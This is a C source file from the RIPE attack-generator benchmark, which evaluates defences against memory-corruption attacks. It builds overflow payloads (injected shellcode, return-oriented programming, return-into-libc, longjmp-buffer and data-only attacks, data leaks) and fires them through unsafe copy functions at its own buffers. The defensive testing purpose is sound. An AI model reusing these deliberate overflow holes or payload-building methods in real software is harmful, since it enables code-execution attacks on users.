#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <setjmp.h>
#include <inttypes.h>

#include "ripe_attack_generator.h"

#ifndef RIPE_DEF_TECHNIQUE
    #define RIPE_DEF_TECHNIQUE DIRECT
#endif
#ifndef RIPE_DEF_INJECT
    #define RIPE_DEF_INJECT RETURN_ORIENTED_PROGRAMMING
#endif
#ifndef RIPE_DEF_CODE_PTR
    #define RIPE_DEF_CODE_PTR RET_ADDR
#endif
#ifndef RIPE_DEF_LOCATION
    #define RIPE_DEF_LOCATION STACK
#endif
#ifndef RIPE_DEF_FUNCTION
    #define RIPE_DEF_FUNCTION MEMCPY
#endif

#define SECRET_STRING_START "Secret data "
#define MAX_SECRET_LEN (32)
#define BUF_LEN (256)

#ifndef SETUP_PROTECTION
    #define SETUP_PROTECTION() do{;}while(0)
#endif
#ifndef DISABLE_PROTECTION
    #define DISABLE_PROTECTION() do{;}while(0)
#endif
#define JUST_SOME_INSTRUCTIONS() for(volatile int _i=0;_i<3;_i++)

// Some architectures require additional bits set on the branch target address (e.g., ARM Thumb)
#ifndef RIPE_BRANCH_OR_MASK
    #define RIPE_BRANCH_OR_MASK 0
#endif

static void attack_once(void);
static enum RIPE_RET attack_wrapper(int no_attack);
static enum RIPE_RET perform_attack(func_t **stack_func_ptr_param,
                                    jmp_buf *stack_jmp_buffer_param);
static void dummy_function(void);

struct ripe_globals g = {
    .output_level = 1,
    .output_reasons = false,
};

#ifndef RIPE_JMPBUF_TYPE
    #define RIPE_JMPBUF_TYPE int
#endif
#ifndef RIPE_JMPBUF_IDX
    #define RIPE_JMPBUF_IDX 0
#endif

jmp_buf control_jmp_buffer; // We use long jmp to get back from attacks.

static struct {
    /* DATA SEGMENT TARGETS
        Overflow buffer
        DOP flag
        Arbitrary read data
        General pointer for indirect attack
        Function pointer
        Longjmp buffer
    */
    uint8_t data_buffer[BUF_LEN];
    uint32_t data_flag;
    char data_secret[MAX_SECRET_LEN];
    void * data_mem_ptr;
    func_t * data_func_ptr;
    jmp_buf data_jmp_buffer;
} d;

static void
init_d(void)
{
    d.data_buffer[0] = '\0';
    strcpy((char *)d.data_secret, SECRET_STRING_START "DATA");
    d.data_flag = 0;
    d.data_mem_ptr = &dummy_function;
    d.data_func_ptr = &dummy_function;
}

/* BSS TARGETS
    Overflow buffer
    DOP flag
    Arbitrary read data
    General pointer for indirect attack
    Function pointer
    Longjmp buffer
*/
struct bss {
    uint8_t bss_buffer[BUF_LEN];
    uint32_t bss_flag;
    char bss_secret[MAX_SECRET_LEN];
    void * bss_mem_ptr;
    func_t * bss_func_ptr;
    jmp_buf bss_jmp_buffer;
};

static void
init_bss(struct bss *b)
{
    b->bss_buffer[0] = '\0';
    strcpy(b->bss_secret, SECRET_STRING_START "BSS");
    b->bss_flag = 0;
    b->bss_mem_ptr = &dummy_function;
    b->bss_func_ptr = &dummy_function;
}

/* HEAP TARGETS
    Overflow buffer + another heap buffer to store:
    DOP flag
    Arbitrary read data
    General pointer for indirect attack
    Function pointer
    Longjmp buffer
*/
struct heap_targets {
    uint8_t * heap_buffer1;
    uint8_t * heap_buffer2;

    uint32_t * heap_flag;
    char * heap_secret;
    void * heap_mem_ptr;
    func_t ** heap_func_ptr_ptr;
    jmp_buf * heap_jmp_buffer;
};

// arbitrary read bug
void
data_leak(uint8_t *buf);

// longjmp() is called from here
void
lj_func(jmp_buf lj_buf);

#ifndef RIPE_SET_RET_ADDR_PTR
    #error RIPE_SET_RET_ADDR_PTR undefined, needed to determine address on the stack where the return address is saved.
#endif

void
info(const char *fmt, ...)
{
    if (g.output_level < 1)
        return;
    va_list ap;
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
}

void
dbg(const char *fmt, ...)
{
    if (g.output_level < 2)
        return;
    va_list ap;
    va_start(ap, fmt);
    vfprintf(stdout, fmt, ap);
    va_end(ap);
}

void
err(const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
}

void
set_attack_indices(size_t t, size_t i, size_t c, size_t l, size_t f)
{
    g.attack.technique = t;
    g.attack.inject_param = i;
    g.attack.code_ptr = c;
    g.attack.location = l;
    g.attack.function = f;
}

int
ripe(int argc, char ** argv)
{
    save_heap(g.heap_safe);

    // Set defaults
    g.attack.technique = RIPE_DEF_TECHNIQUE;
    g.attack.inject_param = RIPE_DEF_INJECT;
    g.attack.code_ptr = RIPE_DEF_CODE_PTR;
    g.attack.location = RIPE_DEF_LOCATION;
    g.attack.function = RIPE_DEF_FUNCTION;

#ifndef RIPE_NO_CLI
    if (parse_ripe_params(argc, argv, &g.attack, &g.output_level) != 0) {
        err("Could not parse command line arguments\n");
        return 1;
    }
    attack_once();
    return 0;
#else
    if (argc > 1) { // argc might be 0 on free-standing implementations
        err("CLI support disabled but %d arguments given\n", argc-1);
        return 1;
    }
#endif

#ifndef RIPE_DEF_ONLY
#ifdef RIPE_TECHNIQUE
    size_t t = RIPE_TECHNIQUE; {
#else
    for (size_t t = 0; t < nr_of_techniques; t++) {
#endif
#ifdef RIPE_INJECT
        size_t i = RIPE_INJECT; {
#else
        for (size_t i = 0; i < nr_of_inject_params; i++) {
#endif
#ifdef RIPE_CODE_PTR
            size_t c = RIPE_CODE_PTR; {
#else
            for (size_t c = 0; c < nr_of_code_ptrs; c++) {
#endif
#ifdef RIPE_LOCATION
                size_t l = RIPE_LOCATION; {
#else
                for (size_t l = 0; l < nr_of_locations; l++) {
#endif
#ifdef RIPE_FUNCTION
                    size_t f = RIPE_FUNCTION; {
#else
                    for (size_t f = 0; f < nr_of_funcs; f++) {
#endif
                        set_attack_indices(t, i, c, l, f);
#else
                        set_attack_indices(g.attack.technique,
                                           g.attack.inject_param,
                                           g.attack.code_ptr,
                                           g.attack.location,
                                           g.attack.function);
#endif
                        SETUP_PROTECTION();
                        attack_once();
                        DISABLE_PROTECTION();
                        restore_heap(g.heap_safe);
#ifndef RIPE_DEF_ONLY
                    }
                }
            }
        }
    }
    printf("%d/%d statically possible, %d are dynamically impossible, %d are seriously broken, %d actually worked, %d were detected, %d failed, and %d led to illegal instructions.\n",
           g.possible, g.possible+g.impossible, g.rtimpossible, g.error, g.successful, g.detected, g.failed, g.illegal_instr);
#endif

    return 0;
} /* main */


__attribute__ ((weak)) void
save_heap(uint8_t *heap_safe){}
__attribute__ ((weak)) void
restore_heap(uint8_t *heap_safe){}

__attribute__ ((weak)) void
longjmp_no_enforce (jmp_buf jb, int rv) {
    longjmp(jb, rv);
}

static void
print_attack_header (void) {
    size_t t = g.attack.technique;
    size_t i = g.attack.inject_param;
    size_t c = g.attack.code_ptr;
    size_t l = g.attack.location;
    size_t f = g.attack.function;
    dbg("==========================================================================================\n");
    info("Trying %s/%s/%s/%s/%s\n", opt_techniques[t], opt_inject_params[i], opt_code_ptrs[c], opt_locations[l], opt_funcs[f]);
    dbg("%zu/%zu/%zu/%zu/%zu\n", t, i, c, l, f);
}

static void
attack_once(void) {
    char *reason;
    if ((reason = is_attack_possible()) != NULL) {
        if (g.output_reasons) {
            print_attack_header();
            err("%s\n", reason);
        }
        g.impossible++;
        return;
    }
    print_attack_header();
    g.possible++;
    init_d();
    int sj = setjmp(control_jmp_buffer);
    if (sj == 0) {
        SETUP_PROTECTION();
        enum RIPE_RET ret = attack_wrapper(0);
        DISABLE_PROTECTION();
        restore_heap(g.heap_safe);
        dbg("attack_wrapper() returned %d (", ret);
        switch (ret) {
            case RET_ATTACK_FAIL: g.failed++; dbg("attack failed)\n"); break;
            case RET_RT_IMPOSSIBLE: g.rtimpossible++; dbg("run-time check says no)\n"); break;
            case RET_ERR: g.error++; dbg("setup error)\n"); break;
            default: g.error++; err("WTF?)\n"); break;
        }
    } else {
        DISABLE_PROTECTION();
        restore_heap(g.heap_safe);
        if (sj != RET_ATTACK_SUCCESS)
            dbg("setjmp() returned via longjmp %d (", sj);
        switch (sj) {
            case RET_ATTACK_SUCCESS:
                g.successful++;
                break;
            case RET_ATTACK_DETECTED:
                g.detected++;
                dbg("attack detected)\n");
                break;
            case RET_ATTACK_FAIL:
                g.failed++;
                dbg("attack failed)\n");
                break;
            case RET_ATTACK_FAIL_ILLEGAL_INSTR:
                g.illegal_instr++;
                dbg("illegal instruction)\n");
                break;
            default:
                g.rtimpossible++;
                dbg(") ");
                err("WTF?\n");
                break;
        }
    }
}

__attribute__ ((noinline))
static void empty_func(void){__asm__("");}

__attribute__ ((noinline)) // Make sure this function has its own stack frame
static enum RIPE_RET
attack_wrapper(int no_attack) {
    if (no_attack != 0) {
        empty_func(); // Enforce function call-related instructions
ancestor_ret:
        JUST_SOME_INSTRUCTIONS();
        DISABLE_PROTECTION();
        info("Attack succeeded: return_into_ancestor successful.\n");
        longjmp_no_enforce(control_jmp_buffer, RET_ATTACK_SUCCESS);
    }
    jmp_buf stack_jmp_buffer_param;
    func_t *stack_func_ptr_param = dummy_function;
#ifdef __GNUC__
    g.ancestor_ret = &&ancestor_ret;
#endif
    return perform_attack(&stack_func_ptr_param, &stack_jmp_buffer_param);
}

/********************/
/* PERFORM_ATTACK() */
/********************/
static enum RIPE_RET
perform_attack(
    func_t ** stack_func_ptr_param,
    jmp_buf *stack_jmp_buffer_param)
{
    void * ret_addr_ptr;
    RIPE_SET_RET_ADDR_PTR(ret_addr_ptr);

    /* STACK TARGETS
        Overflow buffer
        DOP flag
        Arbitrary read data
        General pointer for indirect attack
        Function Pointer
        Long jump buffer
    */
    struct {
        uint8_t stack_buffer[BUF_LEN];
        char stack_secret[MAX_SECRET_LEN];
        uint32_t stack_flag;
        void * stack_mem_ptr;
        func_t * stack_func_ptr;
        jmp_buf stack_jmp_buffer;
    } stack;
    strcpy(stack.stack_secret, SECRET_STRING_START "STACK");
    stack.stack_func_ptr = &dummy_function;
    stack.stack_flag = 0;

    struct heap_targets * heap = malloc(sizeof(struct heap_targets));
    if (heap == NULL) {
        err("malloc()ing heap_targets failed!\n");
        exit(1);
    }
    memset(heap, 0, sizeof(struct heap_targets));

    heap->heap_buffer1 = malloc(BUF_LEN + sizeof(long));
    heap->heap_buffer2 = malloc(BUF_LEN + sizeof(long));
    if (heap->heap_buffer1 == NULL ||
        heap->heap_buffer2 == NULL) {
        err("A heap malloc() failed!\n");
        exit(1);
    }
    heap->heap_jmp_buffer = (jmp_buf *)heap->heap_buffer2;
    heap->heap_func_ptr_ptr = (func_t **)heap->heap_buffer2;
    heap->heap_flag = (uint32_t *)heap->heap_buffer2;
    *heap->heap_flag = 0;

    static struct bss b;
    init_bss(&b);

    /* Address and name of buffer to overflow */
    uint8_t * buffer;
    char * buf_name;
    /* Address and name of eventual target */
    void * target_addr;
    char * target_name;

    switch (g.attack.location) {
        case STACK:
            buffer = stack.stack_buffer;
            buf_name = "stack.stack_buffer";

            // set up stack ptr with DOP target
            if (g.attack.inject_param == DATA_ONLY) {
                stack.stack_mem_ptr = (uint8_t *)&stack.stack_flag;
            }

            break;
        case HEAP: {
            /* Injection into heap buffer                            */

            uint8_t *low, *high;
            if ((uintptr_t) heap->heap_buffer1 < (uintptr_t) heap->heap_buffer2) {
                low = heap->heap_buffer1;
                high = heap->heap_buffer2;
                buf_name = "heap->heap_buffer1";
            } else {
                low = heap->heap_buffer2;
                high = heap->heap_buffer1;
                buf_name = "heap->heap_buffer2";
            }
            dbg("heap buffers: 0x%0*" PRIxPTR ", 0x%0*" PRIxPTR ".\n",
                PRIxPTR_WIDTH, (uintptr_t)low,
                PRIxPTR_WIDTH, (uintptr_t)high);
            buffer = low;
            // Set the location of the memory pointer on the heap
            heap->heap_mem_ptr = high;

            if (g.attack.code_ptr == VAR_LEAK) {
                heap->heap_secret = (char *)high;
                strcpy(heap->heap_secret, SECRET_STRING_START "HEAP");
            }

            // set up heap ptr with DOP target
            if (g.attack.inject_param == DATA_ONLY) {
                heap->heap_mem_ptr = (uint8_t *)heap->heap_flag;
            }
            break;
        }
        case DATA:
            /* Injection into data segment buffer                    */

            buffer = d.data_buffer;
            buf_name = "d.data_buffer";

            // set up data ptr with DOP target
            if (g.attack.inject_param == DATA_ONLY) {
                d.data_mem_ptr = &d.data_flag;
            }
            break;
        case BSS:
            /* Injection into BSS buffer                             */

            buffer = b.bss_buffer;
            buf_name = "b.bss_buffer";

            b.bss_mem_ptr     = &dummy_function;

            // set up bss ptr with DOP target
            if (g.attack.inject_param == DATA_ONLY) {
                b.bss_mem_ptr = (uint8_t *)&b.bss_flag;
            }
            // Also set the location of the function pointer on the heap
            break;
        default:
            err("Unknown choice of attack location");
            return RET_ERR;
    }

    // Set Target Address
    switch (g.attack.code_ptr) {
        case RET_ADDR:
            target_addr = ret_addr_ptr;
            target_name = "ret_addr_ptr";
            break;
        case FUNC_PTR_STACK_VAR:
            target_addr = &stack.stack_func_ptr;
            target_name = "&stack.stack_func_ptr";
            break;
        case FUNC_PTR_STACK_PARAM:
            target_addr = stack_func_ptr_param;
            target_name = "stack_func_ptr_param";
            break;
        case FUNC_PTR_HEAP:
            *heap->heap_func_ptr_ptr = &dummy_function;
            target_addr = heap->heap_func_ptr_ptr;
            target_name = "heap->heap_func_ptr_ptr";
            break;
        case FUNC_PTR_BSS:
            target_addr = &b.bss_func_ptr;
            target_name = "&b.bss_func_ptr";
            break;
        case FUNC_PTR_DATA:
            target_addr = &d.data_func_ptr;
            target_name = "&d.data_func_ptr";
            break;
        case LONGJMP_BUF_STACK_VAR:
            target_addr = &(((RIPE_JMPBUF_TYPE *)stack.stack_jmp_buffer)[RIPE_JMPBUF_IDX]);
            target_name = "stack.stack_jmp_buffer";
            break;
        case LONGJMP_BUF_STACK_PARAM:
            target_addr = &(((RIPE_JMPBUF_TYPE *)stack_jmp_buffer_param)[RIPE_JMPBUF_IDX]);
            target_name = "stack_jmp_buffer_param";
            break;
        case LONGJMP_BUF_HEAP:
            target_addr = &(((RIPE_JMPBUF_TYPE *)heap->heap_jmp_buffer)[RIPE_JMPBUF_IDX]);
            target_name = "heap->heap_jmp_buffer";
            break;
        case LONGJMP_BUF_DATA:
            target_addr = &(((RIPE_JMPBUF_TYPE *)d.data_jmp_buffer)[RIPE_JMPBUF_IDX]);
            target_name = "d.data_jmp_buffer";
            break;
        case LONGJMP_BUF_BSS:
            target_addr = &(((RIPE_JMPBUF_TYPE *)b.bss_jmp_buffer)[RIPE_JMPBUF_IDX]);
            target_name = "b.bss_jmp_buffer";
            break;
        case VAR_BOF:
            switch (g.attack.location) {
                case STACK:
                    target_addr = &stack.stack_flag;
                    target_name = "&stack.stack_flag";
                    break;
                case HEAP:
                    target_addr = heap->heap_flag;
                    target_name = "heap->heap_flag";
                    break;
                case DATA:
                    target_addr = &d.data_flag;
                    target_name = "&d.data_flag";
                    break;
                case BSS:
                    target_addr = &b.bss_flag;
                    target_name = "&b.bss_flag";
                    break;
            }
            break;
        case VAR_LEAK:
            switch (g.attack.location) {
                case STACK:
                    target_addr = &stack.stack_secret;
                    target_name = "&stack.stack_secret";
                    break;
                case HEAP:
                    target_addr = heap->heap_secret;
                    target_name = "heap->heap_secret";
                    break;
                case DATA:
                    target_addr = &d.data_secret;
                    target_name = "&d.data_secret";
                    break;
                case BSS:
                    target_addr = &b.bss_secret;
                    target_name = "&b.bss_secret";
                    break;
            }
            break;
        default:
            err("Unknown choice of code pointer");
            return RET_ERR;
    }

    char * of_target_name; // Name of initial overflow target
    switch (g.attack.technique) {
        case DIRECT:
            g.of_target = target_addr;
            of_target_name = target_name;
            break;
        case INDIRECT:
            switch (g.attack.location) {
                case STACK:
                    g.of_target      = &stack.stack_mem_ptr;
                    of_target_name = "&stack.stack_mem_ptr (indirect)";
                    break;
                case HEAP:
                    g.of_target      = heap->heap_mem_ptr;
                    of_target_name = "heap->heap_mem_ptr (indirect)";
                    break;
                case DATA:
                    g.of_target      = &d.data_mem_ptr;
                    of_target_name = "&d.data_mem_ptr (indirect)";
                    break;
                case BSS:
                    g.of_target      = &b.bss_mem_ptr;
                    of_target_name = "&b.bss_mem_ptr (indirect)";
                    break;
            }
            break;
        default:
            err("Unknown choice of technique");
            return RET_ERR;
    }

    // set longjmp buffers
    switch (g.attack.code_ptr) {
        case LONGJMP_BUF_STACK_VAR:
            if (setjmp(stack.stack_jmp_buffer) != 0) {
                DISABLE_PROTECTION();
                /* setjmp() returns 0 if returning directly and non-zero when returning */
                /* from longjmp() using the saved context. Attack failed.               */
                info("Longjmp attack failed. Returning normally...\n");
                return RET_ATTACK_FAIL;
            }
            break;
        case LONGJMP_BUF_STACK_PARAM:
            if (setjmp(*stack_jmp_buffer_param) != 0) {
                DISABLE_PROTECTION();
                info("Longjmp attack failed. Returning normally...\n");
                return RET_ATTACK_FAIL;
            }
            break;
        case LONGJMP_BUF_HEAP:
            if (setjmp(*heap->heap_jmp_buffer) != 0) {
                DISABLE_PROTECTION();
                info("Longjmp attack failed. Returning normally...\n");
                return RET_ATTACK_FAIL;
            }
            break;
        case LONGJMP_BUF_DATA:
            if (setjmp(d.data_jmp_buffer) != 0) {
                DISABLE_PROTECTION();
                info("Longjmp attack failed. Returning normally...\n");
                return RET_ATTACK_FAIL;
            }
            break;
        case LONGJMP_BUF_BSS:
            if (setjmp(b.bss_jmp_buffer) != 0) {
                DISABLE_PROTECTION();
                info("Longjmp attack failed. Returning normally...\n");
                return RET_ATTACK_FAIL;
            }
            break;
        default:
            break;
    }

    // write shellcode with correct jump target address
    uint8_t *shellcode = NULL;
    size_t size_shellcode = 0;

    char * jump_target_name;
    char * overflow_ptr_name;
    switch (g.attack.inject_param) {
        case INJECTED_CODE_NO_NOP:
        case INJECTED_CODE_NO_NOP_JR:
            g.jump_target = buffer; // shellcode is placed at the beginning of the overflow buffer
            jump_target_name = "buffer (shellcode)";
            build_shellcode(&shellcode, &size_shellcode,
              (g.attack.inject_param == INJECTED_CODE_NO_NOP ? &shellcode_target : &indirect_target));
            break;
        case RETURN_INTO_LIBC:
            // simulate ret2libc by invoking mock libc function
            g.jump_target = (void *)(uintptr_t)&ret2libc_target;
            jump_target_name = "&ret2libc_target";
            break;
        case RETURN_INTO_LIBC_JR:
            // like RETURN_INTO_LIBC but targeting a function legally called indirectly
            g.jump_target = (void *)(uintptr_t)&indirect_target;
            jump_target_name = "&indirect_target";
            break;
        case RETURN_ORIENTED_PROGRAMMING:
            g.jump_target = (void *)((uintptr_t)&rop_target + prologue_length());
            jump_target_name = "&rop_target + PROLOGUE_LENGTH";
            break;
        case RETURN_INTO_ANCESTOR_ROP:
            // simulate returning into an "ancestor" function
            g.jump_target = g.ancestor_ret;
            jump_target_name = "&attack_wrapper_ret";
            break;
        case RETURN_INTO_ANCESTOR:
            // simulate invoking an "ancestor" function (with a frame somewhere in the stack trace)
            g.jump_target = (void *)(uintptr_t)&attack_wrapper;
            jump_target_name = "&attack_wrapper";
            break;
        case DATA_ONLY:
            // corrupt variable with nonzero value
            g.jump_target = (void *)0xdeadc0de;
            jump_target_name = "0xdeadc0de";
            break;
        default:
            err("Unknown choice of attack code");
            return RET_ERR;
    }
    switch (g.attack.technique) {
        case DIRECT:
            g.payload.overflow_ptr = (void *)((uintptr_t)g.jump_target | RIPE_BRANCH_OR_MASK);
            overflow_ptr_name = jump_target_name;
            break;
        case INDIRECT:
            g.payload.overflow_ptr = target_addr;
            overflow_ptr_name = target_name;
            break;
    }
    dbg("buffer (%s) == %p\n", buf_name, (void *)buffer);
    dbg("of_target (%s) == %p\n", of_target_name, g.of_target);
    dbg("jump_target (%s) == %p\n", jump_target_name, g.jump_target);
    dbg("overflow_ptr (%s) == %p\n", overflow_ptr_name, g.payload.overflow_ptr);
    ptrdiff_t target_offset = (uintptr_t)g.of_target - (uintptr_t)buffer;
    if (target_offset < 0) {
        err("of_target (0x%0*" PRIxPTR ") has to be > buffer (0x%0*" PRIxPTR "), but isn't.\n",
            PRIxPTR_WIDTH, (uintptr_t)g.of_target, PRIxPTR_WIDTH, (uintptr_t)buffer);
        return RET_ERR;
    }

    /* Set first byte of buffer to null to allow concatenation functions to */
    /* start filling the buffer from that first byte                        */
    buffer[0] = '\0';

    if (!build_payload(&g.payload, target_offset, shellcode, size_shellcode)) {
        err("Error: Could not build payload\n");
        return RET_RT_IMPOSSIBLE;
    }

    /*************************************************************
     * Overflow buffer with shellcode, padding, and overflow_ptr *
     * Note: Here memory will be corrupted                       *
     *************************************************************/

    dbg("Corrupting data and executing test...\n");

    uintptr_t attack_ret = 0;
    switch (g.attack.function) {
        case MEMCPY:
            // memcpy() shouldn't copy the terminating NULL, therefore - 1
            attack_ret = (uintptr_t)memcpy(buffer, g.payload.buffer, g.payload.size - 1);
            break;
        case HOMEBREW:
            homebrew_memcpy(buffer, g.payload.buffer, g.payload.size - 1);
            break;
#ifndef RIPE_NO_SCANF
        case SSCANF: {
            char fmt[sizeof(g.payload.size)*4+3];
            snprintf(fmt, sizeof(fmt)-1, "%%%zuc", g.payload.size);
            attack_ret = sscanf(g.payload.buffer, fmt, buffer);
            break;
        }
#endif
        case STRCPY:
            attack_ret = (uintptr_t)strcpy((char *)buffer, g.payload.buffer);
            break;
        case STRNCPY:
            attack_ret = (uintptr_t)strncpy((char *)buffer, g.payload.buffer, g.payload.size);
            break;
        case SPRINTF:
             attack_ret = sprintf((char *)buffer, "%s", g.payload.buffer);
            break;
        case SNPRINTF:
            attack_ret = snprintf((char *)buffer, g.payload.size, "%s", g.payload.buffer);
            break;
        case STRCAT:
            attack_ret = (uintptr_t)strcat((char *)buffer, g.payload.buffer);
            break;
        case STRNCAT:
            attack_ret = (uintptr_t)strncat((char *)buffer, g.payload.buffer, g.payload.size);
            break;
        default:
            err("Error: Unknown choice of function\n");
            return RET_ERR;
    }
    if (attack_ret != 0)
        dbg("attack function returned %"PRIdPTR"/0x%"PRIxPTR"\n", attack_ret, attack_ret);

    /***********************************************
     * Overwrite code pointer for indirect attacks *
     ***********************************************/
    if (g.attack.technique == INDIRECT) {
        *(uintptr_t *) *(uintptr_t *) g.of_target = (uintptr_t)g.jump_target | RIPE_BRANCH_OR_MASK;
    }

    switch (g.attack.code_ptr) {
        case RET_ADDR:
            break;
        case FUNC_PTR_STACK_VAR:
            stack.stack_func_ptr();
            break;
        case FUNC_PTR_STACK_PARAM:
            (**stack_func_ptr_param)();
            break;
        case FUNC_PTR_HEAP:
            (*heap->heap_func_ptr_ptr)();
            break;
        case FUNC_PTR_BSS:
            (*b.bss_func_ptr)();
            break;
        case FUNC_PTR_DATA:
            (*d.data_func_ptr)();
            break;
        case LONGJMP_BUF_STACK_VAR:
            lj_func(stack.stack_jmp_buffer);
            break;
        case LONGJMP_BUF_STACK_PARAM:
            lj_func(*stack_jmp_buffer_param);
            break;
        case LONGJMP_BUF_HEAP:
            lj_func(*heap->heap_jmp_buffer);
            break;
        case LONGJMP_BUF_DATA:
            lj_func(d.data_jmp_buffer);
            break;
        case LONGJMP_BUF_BSS:
            lj_func(b.bss_jmp_buffer);
            break;
        case VAR_BOF:
            switch (g.attack.location) {
                case STACK:
                    dop_target(* (uint32_t *) stack.stack_mem_ptr);
                    break;
                case HEAP:
                    dop_target(* (uint32_t *) heap->heap_mem_ptr);
                    break;
                case DATA:
                    dop_target(* (uint32_t *) d.data_mem_ptr);
                    break;
                case BSS:
                    dop_target(* (uint32_t *) b.bss_mem_ptr);
                    break;
            }
            break;
        case VAR_LEAK:
            data_leak(buffer);
            break;
    }
    return RET_ATTACK_FAIL;
} /* perform_attack */

/*******************/
/* BUILD_PAYLOAD() */
/*******************/
bool
build_payload(struct payload * payload, ptrdiff_t offset, uint8_t * shellcode, size_t size_shellcode)
{
    /* + 1 for null termination so that buffer can be */
    /* used with string functions in standard library */
    payload->size = (offset + sizeof(uintptr_t) + 1);

    dbg("----------------\n");

    switch (g.attack.inject_param) {
        case INJECTED_CODE_NO_NOP:
        case INJECTED_CODE_NO_NOP_JR:
            if (payload->size < (size_shellcode + sizeof(func_t*))) {
                return false;
            }
            break;
        case DATA_ONLY:
            if (g.attack.code_ptr == VAR_LEAK) {
                /* The buffer stores the offset ORed with a mask and the mask itself,
                 * simulating a data packet with an encoded length field.
                 * The mask ensures compatibility with string functions. */
                payload->size = 2*sizeof(size_t) + sizeof(char);
                payload->buffer = malloc(payload->size);
                if (payload->buffer == NULL) {
                    err("malloc()ing payload->buffer failed!\n");
                    exit(1);
                }

                size_t mask = (offset & 0x01010101);
                *(((size_t*)payload->buffer)+1) = mask | 0x10101010;
                *(size_t*)payload->buffer = offset | 0x01010101;
                payload->buffer[payload->size-1] = '\0';
                return true;
            } /* else fall through */
        case RETURN_ORIENTED_PROGRAMMING:
        case RETURN_INTO_LIBC:
        case RETURN_INTO_LIBC_JR:
        case RETURN_INTO_ANCESTOR:
        case RETURN_INTO_ANCESTOR_ROP:
            if (payload->size < sizeof(long))
                return false;
            break;
        default:
            return false;
    }
    /* Allocate payload buffer */
    payload->buffer = malloc(payload->size);
    if (payload->buffer == NULL) {
        err("malloc()ing payload->buffer failed!\n");
        exit(1);
    }

    /* Copy shellcode into payload buffer */
    memcpy(payload->buffer, shellcode, size_shellcode);

    /* Calculate number of bytes to pad with */
    /* size - shellcode - target address - null terminator */
    size_t bytes_to_pad =
      (payload->size - size_shellcode - sizeof(void *) - sizeof(char));

    dbg("bytes to pad: %zu\n", bytes_to_pad);
    dbg("overflow_ptr: %p\n", payload->overflow_ptr);

    /* In general we could pad the payload buffer with any data.
     * However, we pad with a related legal address to help setjmp-based attacks
     * on architectures where we overwrite the later restored SP.
     * This allows the invoked code to use the pointed to memory as fake stack
     * without immediately crashing on stack operations.
     * For more complicated cases we might have to get more creative. */
    RIPE_JMPBUF_TYPE *pad = (RIPE_JMPBUF_TYPE *)&payload->buffer[size_shellcode + bytes_to_pad];
    for (size_t i = 0; i < bytes_to_pad/sizeof(RIPE_JMPBUF_TYPE); i++) {
        pad[-i] = (RIPE_JMPBUF_TYPE)g.of_target;
    }

    /* Pad the remaining bytes with 'A', if any. */
    memset((payload->buffer + size_shellcode), 'A', bytes_to_pad%sizeof(RIPE_JMPBUF_TYPE));

    memcpy(&(payload->buffer[size_shellcode + bytes_to_pad]),
           &payload->overflow_ptr,
           sizeof(void *));

    char *first_null = memchr(payload->buffer, '\0', payload->size-1);
    if (first_null != NULL) {
        dbg("Payload contains null character at offset %"PRIdPTR"\n",
            (uintptr_t)first_null-(uintptr_t)payload->buffer);

        if (g.attack.function == SSCANF ||
            g.attack.function == STRCPY ||
            g.attack.function == STRNCPY ||
            g.attack.function == SPRINTF ||
            g.attack.function == SNPRINTF ||
            g.attack.function == STRCAT ||
            g.attack.function == STRNCAT) {
            dbg("This cannot work with string functions, aborting\n");
            return false;
        }
    }

    /* Finally, add the terminating null character at the end */
    payload->buffer[payload->size - 1] = '\0';
    
    dbg("payload of %zu bytes created.\n", payload->size);
    dbg("----------------\n");

    return true;
} /* build_payload */

static void
dummy_function(void) {
    info("Attack failed: dummy_function() reached.\n");
}

// call longjmp on a buffer in perform_attack()
void
lj_func(jmp_buf lj_buf)
{
    longjmp(lj_buf, 1111);
}

void
homebrew_memcpy(void * dst, const void * src, size_t length)
{
    char * d, * s;

    d = (char *) dst;
    s = (char *) src;

    while (length--) {
        *d++ = *s++;
    }
}

void
shellcode_target()
{
    JUST_SOME_INSTRUCTIONS();
    DISABLE_PROTECTION();
    info("Attack succeeded: shellcode_target() reached.\n");
    longjmp_no_enforce(control_jmp_buffer, RET_ATTACK_SUCCESS);
}

void
ret2libc_target()
{
    JUST_SOME_INSTRUCTIONS();
    DISABLE_PROTECTION();
    info("Attack succeeded: ret2libc_target() reached.\n");
    longjmp_no_enforce(control_jmp_buffer, RET_ATTACK_SUCCESS);
}

void
indirect_target()
{
    JUST_SOME_INSTRUCTIONS();
    DISABLE_PROTECTION();
    info("Attack succeeded: indirect_target() reached.\n");
    longjmp_no_enforce(control_jmp_buffer, RET_ATTACK_SUCCESS);
}

void
dop_target(uint32_t auth)
{
    JUST_SOME_INSTRUCTIONS();
    if (!auth) {
        DISABLE_PROTECTION();
        info("DOP attack failed\n");
        longjmp_no_enforce(control_jmp_buffer, RET_ATTACK_FAIL);
    } else {
        DISABLE_PROTECTION();
        info("Attack succeeded: DOP memory corruption reached.\n");
        longjmp_no_enforce(control_jmp_buffer, RET_ATTACK_SUCCESS);
    }
}

// Make sure prologue length does not change
#ifdef __clang__
__attribute__ ((optnone))
#else
__attribute__ ((optimize (0)))
#endif
void
rop_target(void)
{
    JUST_SOME_INSTRUCTIONS();
    DISABLE_PROTECTION();
    info("Attack succeeded: ROP function reached.\n");
    longjmp_no_enforce(control_jmp_buffer, RET_ATTACK_SUCCESS);
}

void
data_leak(uint8_t *buf) {
    size_t size = *(size_t*)buf;
    size_t mask = *((size_t*)buf+1);
    size = (size & ~0x01010101) | (0x01010101 & mask);
    uint8_t *msg = malloc(size);
    if (msg == NULL) {
        err("malloc()ing data_leak buffer failed!\n");
        exit(1);
    }
    dbg("%s: allocated %zu B\n", __func__, size);

    size_t common_len = strlen(SECRET_STRING_START);
    const char *loc_string;
    switch (g.attack.location) {
        case BSS: loc_string = "BSS"; break;
        case DATA: loc_string = "DATA"; break;
        case HEAP: loc_string = "HEAP"; break;
        case STACK: loc_string = "STACK"; break;
        default:
            err("%s: location %d not implemented.\n",
            __func__, g.attack.location);
            return;
    }

    memcpy(msg, buf + size, size);
    DISABLE_PROTECTION();
    if ((strncmp((char *)msg, SECRET_STRING_START, common_len) == 0) &&
        (strcmp((char *)(msg+common_len), loc_string) == 0)) {
        info("Attack succeeded: found correct secret: \"%s\"\n", msg);
        longjmp_no_enforce(control_jmp_buffer, RET_ATTACK_SUCCESS);
    }
    info("Data leak attack failed: msg does not match secret string\n");
}

char *
